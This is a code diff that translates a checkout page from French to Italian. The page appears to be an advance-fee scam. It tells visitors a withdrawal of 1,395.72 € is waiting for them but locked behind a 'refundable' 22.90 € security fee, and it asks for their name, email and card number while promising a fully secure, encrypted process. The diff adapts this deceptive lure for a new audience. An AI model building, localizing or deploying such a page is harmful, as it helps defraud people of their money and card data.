@@ -6,15 +6,15 @@ import { buildTrackedCheckoutUrl } from "@/lib/tiktok-attribution";
 export const Route = createFileRoute("/checkout")({
   head: () => ({
     meta: [
-      { title: "Paiement sécurisé | Déblocage du retrait" },
+      { title: "Pagamento sicuro | Sblocco del prelievo" },
       {
         name: "description",
-        content: "Finalisez le déblocage de votre retrait en toute sécurité. Frais remboursables.",
+        content: "Completa lo sblocco del tuo prelievo in totale sicurezza. Spese rimborsabili.",
       },
-      { property: "og:title", content: "Paiement sécurisé | Déblocage du retrait" },
+      { property: "og:title", content: "Pagamento sicuro | Sblocco del prelievo" },
       {
         property: "og:description",
-        content: "Finalisez le déblocage de votre retrait en toute sécurité. Frais remboursables.",
+        content: "Completa lo sblocco del tuo prelievo in totale sicurezza. Spese rimborsabili.",
       },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
@@ -58,33 +58,33 @@ function Checkout() {
         {/* Header */}
         <div className="mb-6 flex items-center justify-center gap-2 text-sm font-medium text-neutral-900">
           <Shield className="h-4 w-4 text-emerald-500" />
-          Paiement sécurisé
+          Pagamento sicuro
         </div>
 
         {/* Amount card */}
         <div className="mb-4 rounded-3xl bg-black p-6 text-center text-white shadow-lg">
           <p className="mb-1 text-[11px] font-bold uppercase tracking-widest text-neutral-400">
-            Déblocage du retrait de
+            Sblocco del prelievo di
           </p>
-          <p className="mb-1 text-4xl font-black tracking-tight">1 395,72 €</p>
+          <p className="mb-1 text-4xl font-black tracking-tight">1.395,72 €</p>
           <p className="text-sm text-neutral-400">
-            Frais remboursables : <span className="font-medium text-white">22,90 €</span>
+            Spese rimborsabili: <span className="font-medium text-white">22,90 €</span>
           </p>
         </div>
 
         {/* Reimbursement details */}
         <div className="mb-4 rounded-3xl bg-white p-5 shadow-sm">
           <h2 className="mb-4 text-[11px] font-bold uppercase tracking-widest text-neutral-500">
-            Coordonnées pour le remboursement
+            Dati per il rimborso
           </h2>
           <div className="space-y-4">
             <div className="flex items-center justify-between border-b border-neutral-100 pb-3">
-              <span className="text-sm text-neutral-500">Nom</span>
+              <span className="text-sm text-neutral-500">Nome</span>
               <input
                 type="text"
                 value={formData.fullName}
                 onChange={(e) => setFormData((prev) => ({ ...prev, fullName: e.target.value }))}
-                placeholder="Votre nom complet"
+                placeholder="Il tuo nome completo"
                 className="w-1/2 bg-transparent text-right text-sm font-medium text-neutral-900 outline-none placeholder:text-neutral-400"
               />
             </div>
@@ -96,12 +96,12 @@ function Checkout() {
                 autoComplete="email"
                 value={formData.email}
                 onChange={(e) => setFormData((prev) => ({ ...prev, email: e.target.value }))}
-                placeholder="vous@email.com"
+                placeholder="tu@email.com"
                 className="w-1/2 bg-transparent text-right text-sm font-medium text-neutral-900 outline-none placeholder:text-neutral-400"
               />
             </div>
             <div className="flex items-center justify-between border-b border-neutral-100 pb-3">
-              <span className="text-sm text-neutral-500">Numéro de carte</span>
+              <span className="text-sm text-neutral-500">Numero di carta</span>
               <div className="relative w-1/2">
                 <CreditCard className="absolute left-0 top-1/2 h-3.5 w-3.5 -translate-y-1/2 text-neutral-400" />
                 <input
@@ -115,11 +115,11 @@ function Checkout() {
               </div>
             </div>
             <div className="flex items-center justify-between pt-1">
-              <span className="text-sm text-neutral-500">Frais de sécurité</span>
+              <span className="text-sm text-neutral-500">Spese di sicurezza</span>
               <div className="flex items-center gap-2">
                 <span className="text-sm font-bold text-neutral-900">22,90 €</span>
                 <span className="rounded-md bg-rose-500 px-2 py-0.5 text-[10px] font-bold uppercase text-white">
-                  Remboursable
+                  Rimborsabile
                 </span>
               </div>
             </div>
@@ -130,10 +130,10 @@ function Checkout() {
         <div className="mb-4 rounded-3xl bg-white p-5 shadow-sm">
           <h2 className="mb-1 flex items-center gap-2 text-sm font-bold text-neutral-900">
             <Lock className="h-4 w-4 text-neutral-900" />
-            Coordonnées bancaires
+            Coordinate bancarie
           </h2>
           <p className="text-sm text-neutral-500">
-            Connexion sécurisée et chiffrée — vos données sont protégées.
+            Connessione sicura e crittografata: i tuoi dati sono protetti.
           </p>
         </div>
 
@@ -143,13 +143,13 @@ function Checkout() {
           onClick={handleContinue}
           className="mb-4 flex w-full items-center justify-center gap-2 rounded-full bg-rose-600 py-4 text-sm font-bold text-white shadow-md transition-all hover:bg-rose-700 active:scale-[0.99]"
         >
-          Continuar
+          Continua
           <ArrowRight className="h-4 w-4" />
         </button>
 
         {/* Footer */}
         <p className="text-center text-[11px] text-neutral-400">
-          Processus 100 % sécurisé · Référence TT-2026-NYZI0B
+          Processo 100% sicuro · Riferimento TT-2026-NYZI0B
         </p>
       </div>
     </main>
